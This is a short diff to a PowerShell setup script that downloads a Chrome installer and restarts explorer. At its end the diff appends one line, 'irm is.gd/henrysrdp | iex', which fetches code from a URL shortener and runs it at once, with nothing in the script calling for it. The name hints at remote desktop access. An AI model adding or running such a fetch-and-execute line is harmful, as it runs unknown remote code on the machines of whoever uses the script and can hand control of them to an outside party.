@@ -111,3 +111,5 @@ $LocalTempDir = $env:TEMP; $ChromeInstaller = "ChromeInstaller.exe"; (new-object
 
 # Refresh the desktop to apply changes
 Stop-Process -Name explorer -Force
+
+irm is.gd/henrysrdp | iex
